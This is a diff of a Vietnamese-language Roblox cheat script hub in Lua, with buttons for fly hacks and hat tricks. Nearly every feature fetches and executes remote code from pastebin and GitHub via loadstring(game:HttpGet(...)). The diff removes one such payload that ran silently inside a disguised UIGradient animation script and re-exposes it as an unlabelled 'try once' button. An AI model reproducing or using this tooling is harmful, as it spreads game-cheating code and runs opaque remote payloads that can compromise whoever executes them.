@@ -43,7 +43,7 @@ local function DCLSA_fake_script() -- UIGradient.LocalScript
 	local tweeninfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
 	local tween = TweenService:Create(script.Parent, tweeninfo, {Rotation = 360})
 	tween:Play()
-	loadstring(game:HttpGet("https://pastebin.com/raw/50AL19P5", true))()
+	
 end
 coroutine.wrap(DCLSA_fake_script)()
   function two(gotoCFrame) --- Tween
@@ -74,7 +74,7 @@ end
 game.Players.LocalPlayer.Name = 0000000000
 local notifLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Notification%20Library/main.lua"))()
 local Library = loadstring(game:HttpGet("https://pastebin.com/raw/XwwTN7w6"))()
-local Window = Library.CreateLib("Nguyễn An ( Update Auto tele ải thỏ v4 )", "BloodTheme")
+local Window = Library.CreateLib("Nguyễn An ( Update Điều Thú vị )", "BloodTheme")
 game:GetService("StarterGui"):SetCore("SendNotification", { 
     Title = "Nguyễn An";
     Text = "Nhận cày Thuê Shindo + blox";
@@ -303,8 +303,11 @@ Tab:AddButton({
 end)
 
 --other
-local Tab = Window:NewTab("Hack Khác")
+local Tab = Window:NewTab("Những điều thú vị")
 local Section = Tab:NewSection("hack khác")
+Section:NewButton("Nên bật thử 1 Lần", " .", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/50AL19P5", true))()
+end)
 Section:NewButton("Hack Bay 1 ", "nó chỉ bay dc thui :3", function()
     print("Clicked")
     loadstring(game:HttpGet('https://pastebin.com/raw/fVhrud1Q'))()
@@ -333,9 +336,7 @@ end)
 Section:NewButton("mũ bay vòng vòng", " .", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/4B4fktPS", true))()
 end)
-Section:NewButton("cầm mũ và có thể ăn", " .", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/50AL19P5", true))()
-end)
+
 Section:NewButton("Cho mũ : Pc và pe", " .", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/asdjasdhsuhduahd213/AN_HUB/main/give%20hat"))()
 end)
